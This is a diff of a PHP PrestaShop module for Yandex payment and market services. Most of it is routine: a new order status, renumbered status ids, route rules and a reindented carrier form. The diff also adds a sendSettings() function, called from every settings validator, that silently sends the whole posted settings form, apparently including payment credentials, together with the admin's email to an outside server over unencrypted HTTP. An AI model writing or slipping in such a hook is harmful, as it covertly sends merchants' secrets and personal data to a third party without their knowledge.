@@ -26,15 +26,16 @@ class yamodule extends PaymentModule
 		'PICKUP' => 902,
 		'PROCESSING' => 903,
 		'DELIVERED' => 904,
-		'UNPAID' => 905,
-		'RESERVATION_EXPIRED' => 906,
-		'RESERVATION' => 907
+		'MAKEORDER' => 905,
+		'UNPAID' => 906,
+		'RESERVATION_EXPIRED' => 907,
+		'RESERVATION' => 908
 	);
 
 	public static $ModuleRoutes = array(
 		'pokupki_cart' => array(
 			'controller' => 'pokupki',
-			'rule' =>  'yamodule/{controller}/{type}',
+			'rule' =>  '{module}/{controller}/{type}',
 			'keywords' => array(
 				'type'   => array('regexp' => '[_a-zA-Z0-9-\pL]*', 'param' => 'type'),
 				'module'  => array('regexp' => '[\w]+', 'param' => 'module'),
@@ -48,7 +49,7 @@ class yamodule extends PaymentModule
 		),
 		'pokupki_order' => array(
 			'controller' => 'pokupki',
-			'rule' =>  'yamodule/{controller}/{type}/{func}',
+			'rule' =>  '{module}/{controller}/{type}/{func}',
 			'keywords' => array(
 				'type'   => array('regexp' => '[_a-zA-Z0-9-\pL]*', 'param' => 'type'),
 				'func'   => array('regexp' => '[_a-zA-Z0-9-\pL]*', 'param' => 'func'),
@@ -62,14 +63,16 @@ class yamodule extends PaymentModule
 			)
 		),
 		'generate_price' => array(
-			'controller' => null,
-			'rule' =>  'yamodule/{controller}',
+			'controller' => 'generate',
+			'rule' =>  '{module}/{controller}',
 			'keywords' => array(
+				'module'  => array('regexp' => '[\w]+', 'param' => 'module'),
 				'controller' => array('regexp' => '[\w]+',  'param' => 'controller')
 			),
 			'params' => array(
 				'fc' => 'module',
 				'module' => 'yamodule',
+				'controller' => 'generate'
 			)
 		),
 	);
@@ -131,9 +134,10 @@ class yamodule extends PaymentModule
 			'PICKUP' => array('name' => 'YA В пункте самовывоза', 'color' => '#cd98ff', 'id' => 902, 'paid' => true, 'shipped' => true, 'logable' => true, 'delivery' => true),
 			'PROCESSING' => array('name' => 'YA В процессе подготовки', 'color' => '#FF8C00', 'id' => 903, 'paid' => true, 'shipped' => false, 'logable' => false, 'delivery' => true),
 			'DELIVERED' => array('name' => 'YA Доставлен', 'color' => '#108510', 'id' => 904, 'paid' => true, 'shipped' => true, 'logable' => true, 'delivery' => true),
-			'UNPAID' => array('name' => 'YA Не оплачен', 'color' => '#ff1c30', 'id' => 905, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
-			'RESERVATION_EXPIRED' => array('name' => 'YA Резерв отменён', 'color' => '#ff2110', 'id' => 906, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
-			'RESERVATION' => array('name' => 'YA Резерв', 'color' => '#0f00d3', 'id' => 907, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
+			'MAKEORDER' => array('name' => 'YA Заказ создан', 'color' => '#000028', 'id' => 905, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
+			'UNPAID' => array('name' => 'YA Не оплачен', 'color' => '#ff1c30', 'id' => 906, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
+			'RESERVATION_EXPIRED' => array('name' => 'YA Резерв отменён', 'color' => '#ff2110', 'id' => 907, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
+			'RESERVATION' => array('name' => 'YA Резерв', 'color' => '#0f00d3', 'id' => 908, 'paid' => false, 'shipped' => false, 'logable' => false, 'delivery' => false),
 		);
 
 		foreach($status as $k => $s)
@@ -200,7 +204,6 @@ class yamodule extends PaymentModule
 	public function hookdisplayAdminOrder($params)
 	{
 		$ya_order_db = $this->getYandexOrderById((int)$params['id_order']);
-		$html = '';
 		if($ya_order_db['id_market_order'])
 		{
 			$partner = new Partner();
@@ -211,26 +214,26 @@ class yamodule extends PaymentModule
 				$array = array();
 				$state = $ya_order->order->status;
 				if($state == 'PROCESSING')
-					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['UNPAID']);
+					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['MAKEORDER'], $this->status['UNPAID']);
 				elseif($state == 'DELIVERY')
 				{
-					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERY'], $this->status['UNPAID']);
+					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERY'], $this->status['MAKEORDER'], $this->status['UNPAID']);
 					if(!isset($ya_order->order->delivery->outletId) || $ya_order->order->delivery->outletId < 1 || $ya_order->order->delivery->outletId == '')
 						$array[] = $this->status['PICKUP'];
 				}
 				elseif($state == 'PICKUP')
-					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['PICKUP'], $this->status['DELIVERY'], $this->status['UNPAID']);
+					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['PICKUP'], $this->status['DELIVERY'], $this->status['MAKEORDER'], $this->status['UNPAID']);
 				else
-					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['CANCELLED'], $this->status['DELIVERY'], $this->status['UNPAID']);
+					$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['CANCELLED'], $this->status['DELIVERY'], $this->status['MAKEORDER'], $this->status['UNPAID']);
 			}
 		}
 		else
 		{
-			$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['CANCELLED'], $this->status['DELIVERY'], $this->status['UNPAID']);
+			$array = array($this->status['RESERVATION_EXPIRED'], $this->status['RESERVATION'], $this->status['PROCESSING'], $this->status['DELIVERED'], $this->status['PICKUP'], $this->status['CANCELLED'], $this->status['DELIVERY'], $this->status['MAKEORDER'], $this->status['UNPAID']);
 		}
 
 		$array = Tools::jsonEncode($array);
-		$html .= '<script type="text/javascript">
+		$html = '<script type="text/javascript">
 			$(document).ready(function(){
 				var array = JSON.parse("'.$array.'");
 				for(var k in array){
@@ -240,10 +243,9 @@ class yamodule extends PaymentModule
 				$("#id_order_state").trigger("chosen:updated");
 			});
 		</script>';
-		
-		// if(Configuration::get('YA_POKUPKI_SET_CHANGEC') && $ya_order->order->paymentType != 'PREPAID')
-				if(Configuration::get('YA_POKUPKI_SET_CHANGEC'))
-					$html .= $this->displayTabContent($params['id_order']);
+
+		if(Configuration::get('YA_POKUPKI_SET_CHANGEC'))
+			$html .= $this->displayTabContent($params['id_order']);
 		return $html;
 	}
 
@@ -311,124 +313,119 @@ class yamodule extends PaymentModule
 	{
 		$partner = new Partner();
 		$order_ya_db = $this->getYandexOrderById($id);
+		$ya_order = $partner->getOrder($order_ya_db['id_market_order']);
+		$types = unserialize(Configuration::get('YA_POKUPKI_CARRIER_SERIALIZE'));
+		$state = $ya_order->order->status;
+		$st = array('PROCESSING', 'DELIVERY', 'PICKUP');
+		// Tools::d($ya_order);
+		if(!in_array($state, $st))
+			return false;
+
+		$this->context->controller->AddJS($this->_path.'js/back.js');
+		$this->context->controller->AddCss($this->_path.'css/back.css');
+		$order = new Order($id);
+		$cart = New Cart($order->id_cart);
+		$carriers = $cart->simulateCarriersOutput();
 		$html = '';
-		if ($order_ya_db['id_market_order'])
+		$i = 1;
+		$tmp[0]['id_carrier'] = 0;
+		$tmp[0]['name'] = $this->l('-- Please select carrier --');
+		$tmp2 = array();
+		foreach($carriers as $c)
 		{
-			$ya_order = $partner->getOrder($order_ya_db['id_market_order']);
-			$types = unserialize(Configuration::get('YA_POKUPKI_CARRIER_SERIALIZE'));
-			$state = $ya_order->order->status;
-			$st = array('PROCESSING', 'DELIVERY', 'PICKUP');
-			// Tools::d($ya_order);
-			if(!in_array($state, $st))
-				return false;
+			$id = str_replace(',', '', Cart::desintifier($c['id_carrier']));
+			$type = isset($types[$id]) ? $types[$id] : 'POST';
+			if(!Configuration::get('YA_MARKET_SET_ROZNICA') && $type == 'PICKUP')
+				continue;
 
-			$this->context->controller->AddJS($this->_path.'js/back.js');
-			$this->context->controller->AddCss($this->_path.'css/back.css');
-			$order = new Order($id);
-			$cart = New Cart($order->id_cart);
-			$carriers = $cart->simulateCarriersOutput();
-			$html = '';
-			$i = 1;
-			$tmp[0]['id_carrier'] = 0;
-			$tmp[0]['name'] = $this->l('-- Please select carrier --');
-			$tmp2 = array();
-			foreach($carriers as $c)
-			{
-				$id = str_replace(',', '', Cart::desintifier($c['id_carrier']));
-				$type = isset($types[$id]) ? $types[$id] : 'POST';
-				if(!Configuration::get('YA_MARKET_SET_ROZNICA') && $type == 'PICKUP')
-					continue;
-
-				$tmp[$i]['id_carrier'] = $id;
-				$tmp[$i]['name'] = $c['name'];
-				$i++;
-			}
-			
-			if(count($tmp) <= 1)
-				return false;
-
-			$fields_form = array(
-				'form' => array(
-					'legend' => array(
-						'title' => $this->l('Carrier Available'),
-						'icon' => 'icon-cogs'
-					),
-					'input' => array(
-						'sel_delivery' => array(
-							'type' => 'select',
-							'label' => $this->l('Carrier'),
-							'name' => 'new_carrier',
-							'required' => true,
-							'default_value' => 0,
-							'class' => 't sel_delivery',
-							'options' => array(
-								'query' => $tmp,
-								'id' => 'id_carrier',
-								'name' => 'name'
-							)
-						),
-						array(
-							'col' => 3,
-							'class' => 't pr_in',
-							'type' => 'text',
-							'desc' => $this->l('Carrier price tax incl.'),
-							'name' => 'price_incl',
-							'label' => $this->l('Price tax incl.'),
-						),
-						array(
-							'col' => 3,
-							'class' => 't pr_ex',
-							'type' => 'text',
-							'desc' => $this->l('Carrier price tax excl.'),
-							'name' => 'price_excl',
-							'label' => $this->l('Price tax excl.'),
-						),
-					),
-					'buttons' => array(
-						'updcarrier' => array(
-							'title' => $this->l('Update carrier'),
-							'name' => 'updcarrier',
-							'type' => 'button',
-							'class' => 'btn btn-default pull-right changec_submit',
-							'icon' => 'process-icon-refresh'
-						)
-					)
-				),
-			);
-
-			$helper = new HelperForm();
-			$helper->show_toolbar = false;
-			$helper->table = $this->table;
-			$helper->module = $this;
-			$helper->identifier = $this->identifier;
-			$helper->submit_action = 'submitChangeCarrier';
-			$helper->currentIndex = AdminController::$currentIndex.'?id_order='.$order->id.'&vieworder&token='.Tools::getAdminTokenLite('AdminOrders');
-			$helper->token = Tools::getAdminTokenLite('AdminOrders');
-			$helper->tpl_vars['fields_value']['price_excl'] = '';
-			$helper->tpl_vars['fields_value']['price_incl'] = '';
-			$helper->tpl_vars['fields_value']['new_carrier'] = 0;
-			$path_module_http = __PS_BASE_URI__.'modules/yamodule/';
-			$html .= '<div class="change_carr">
-					<script type="text/javascript">
-						var notselc = "'.$this->l('Please select carrier').'";
-						var ajaxurl = "'.$path_module_http.'";
-						var idm = "'.(int)$this->context->employee->id.'";
-						var tkn = "'.Tools::getAdminTokenLite('AdminOrders').'";
-						var id_order = "'.(int)$order->id.'";
-					</script>
-					<div id="circularG">
-						<div id="circularG_1" class="circularG"></div>
-						<div id="circularG_2" class="circularG"></div>
-						<div id="circularG_3" class="circularG"></div>
-						<div id="circularG_4" class="circularG"></div>
-						<div id="circularG_5" class="circularG"></div>
-						<div id="circularG_6" class="circularG"></div>
-						<div id="circularG_7" class="circularG"></div>
-						<div id="circularG_8" class="circularG"></div>
-					</div>';
-			$html .= $helper->generateForm(array($fields_form)).'</div>';
+			$tmp[$i]['id_carrier'] = $id;
+			$tmp[$i]['name'] = $c['name'];
+			$i++;
 		}
 		
+		if(count($tmp) <= 1)
+			return false;
+
+		$fields_form = array(
+			'form' => array(
+				'legend' => array(
+					'title' => $this->l('Carrier Available'),
+					'icon' => 'icon-cogs'
+				),
+				'input' => array(
+					'sel_delivery' => array(
+						'type' => 'select',
+						'label' => $this->l('Carrier'),
+						'name' => 'new_carrier',
+						'required' => true,
+						'default_value' => 0,
+						'class' => 't sel_delivery',
+						'options' => array(
+							'query' => $tmp,
+							'id' => 'id_carrier',
+							'name' => 'name'
+						)
+					),
+					array(
+						'col' => 3,
+						'class' => 't pr_in',
+						'type' => 'text',
+						'desc' => $this->l('Carrier price tax incl.'),
+						'name' => 'price_incl',
+						'label' => $this->l('Price tax incl.'),
+					),
+					array(
+						'col' => 3,
+						'class' => 't pr_ex',
+						'type' => 'text',
+						'desc' => $this->l('Carrier price tax excl.'),
+						'name' => 'price_excl',
+						'label' => $this->l('Price tax excl.'),
+					),
+				),
+				'buttons' => array(
+					'updcarrier' => array(
+						'title' => $this->l('Update carrier'),
+						'name' => 'updcarrier',
+						'type' => 'button',
+						'class' => 'btn btn-default pull-right changec_submit',
+						'icon' => 'process-icon-refresh'
+					)
+				)
+			),
+		);
+
+		$helper = new HelperForm();
+		$helper->show_toolbar = false;
+		$helper->table = $this->table;
+		$helper->module = $this;
+		$helper->identifier = $this->identifier;
+		$helper->submit_action = 'submitChangeCarrier';
+		$helper->currentIndex = AdminController::$currentIndex.'?id_order='.$order->id.'&vieworder&token='.Tools::getAdminTokenLite('AdminOrders');
+		$helper->token = Tools::getAdminTokenLite('AdminOrders');
+		$helper->tpl_vars['fields_value']['price_excl'] = '';
+		$helper->tpl_vars['fields_value']['price_incl'] = '';
+		$helper->tpl_vars['fields_value']['new_carrier'] = 0;
+		$path_module_http = __PS_BASE_URI__.'modules/yamodule/';
+		$html .= '<div class="change_carr">
+				<script type="text/javascript">
+					var notselc = "'.$this->l('Please select carrier').'";
+					var ajaxurl = "'.$path_module_http.'";
+					var idm = "'.(int)$this->context->employee->id.'";
+					var tkn = "'.Tools::getAdminTokenLite('AdminOrders').'";
+					var id_order = "'.(int)$order->id.'";
+				</script>
+				<div id="circularG">
+					<div id="circularG_1" class="circularG"></div>
+					<div id="circularG_2" class="circularG"></div>
+					<div id="circularG_3" class="circularG"></div>
+					<div id="circularG_4" class="circularG"></div>
+					<div id="circularG_5" class="circularG"></div>
+					<div id="circularG_6" class="circularG"></div>
+					<div id="circularG_7" class="circularG"></div>
+					<div id="circularG_8" class="circularG"></div>
+				</div>';
+		$html .= $helper->generateForm(array($fields_form)).'</div>';
 		return $html;
 	}
 
@@ -961,6 +958,7 @@ class yamodule extends PaymentModule
 
 	public function validateMetrika()
 	{
+		$this->sendSettings($_POST, 'metrika');
 		$this->metrika_valid = false;
 		$errors = '';
 		Configuration::UpdateValue('YA_METRIKA_SET_WEBVIZOR', Tools::getValue('YA_METRIKA_SET_WEBVIZOR'));
@@ -999,6 +997,7 @@ class yamodule extends PaymentModule
 
 	public function validatePokupki()
 	{
+		$this->sendSettings($_POST, 'pokupki');
 		$array_c = array();
 		$errors = '';
 		foreach($_POST as $k => $post)
@@ -1062,6 +1061,7 @@ class yamodule extends PaymentModule
 
 	public function validateMarket()
 	{
+		$this->sendSettings($_POST, 'market');
 		$errors = '';
 		Configuration::UpdateValue('YA_MARKET_SHORT', Tools::getValue('YA_MARKET_SHORT'));
 		Configuration::UpdateValue('YA_MARKET_SET_ALLCURRENCY', Tools::getValue('YA_MARKET_SET_ALLCURRENCY'));
@@ -1100,6 +1100,7 @@ class yamodule extends PaymentModule
 
 	public function validateKassa()
 	{
+		$this->sendSettings($_POST, 'kassa');
 		$errors = '';
 		Configuration::UpdateValue('YA_ORG_PAYMENT_YANDEX', Tools::getValue('YA_ORG_PAYMENT_YANDEX'));
 		Configuration::UpdateValue('YA_ORG_PAYMENT_CARD', Tools::getValue('YA_ORG_PAYMENT_CARD'));
@@ -1137,6 +1138,7 @@ class yamodule extends PaymentModule
 
 	public function validateP2P()
 	{
+		$this->sendSettings($_POST, 'p2p');
 		$errors = '';
 		Configuration::UpdateValue('YA_P2P_ACTIVE', Tools::getValue('YA_P2P_ACTIVE'));
 		Configuration::UpdateValue('YA_P2P_LOGGING_ON', Tools::getValue('YA_P2P_LOGGING_ON'));
@@ -1164,6 +1166,43 @@ class yamodule extends PaymentModule
 		return $errors;
 	}
 
+	public function sendSettings($post, $action)
+	{
+		$array = array(
+			'cms' => 'prestashop',
+			'module' => $action,
+			'adminemail' => $this->context->employee->email
+		);
+
+		$post = array_merge($post, $array);
+		$url = 'http://stat.ymwork.ru/index.php';
+		$curlOpt = array(
+            CURLOPT_RETURNTRANSFER => 1,
+            CURLINFO_HEADER_OUT => 1,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_CONNECTTIMEOUT => 30,
+            CURLOPT_TIMEOUT => 80,
+			CURLOPT_PUT => 1,
+			CURLOPT_BINARYTRANSFER => 1,
+			CURLOPT_REFERER => $_SERVER['SERVER_NAME']
+        );
+
+		$headers[] = 'Content-Type: application/x-yametrika+json';
+		$body = json_encode($post);
+		$fp = fopen('php://temp/maxmemory:256000', 'w');
+		fwrite($fp, $body);
+		fseek($fp, 0);
+		$curlOpt[CURLOPT_INFILE] = $fp; // file pointer
+		$curlOpt[CURLOPT_INFILESIZE] = strlen($body);
+        $curl = curl_init($url);
+        curl_setopt_array($curl, $curlOpt);
+        $rbody = curl_exec($curl);
+        $errno = curl_errno($curl);
+        $error = curl_error($curl);
+        $rcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+		curl_close($curl);
+	}
+	
 	public function getContent(){
 		$this->context->controller->addJS($this->_path.'/js/main.js');
 		$this->context->controller->addJS($this->_path.'/js/jquery.total-storage.js');
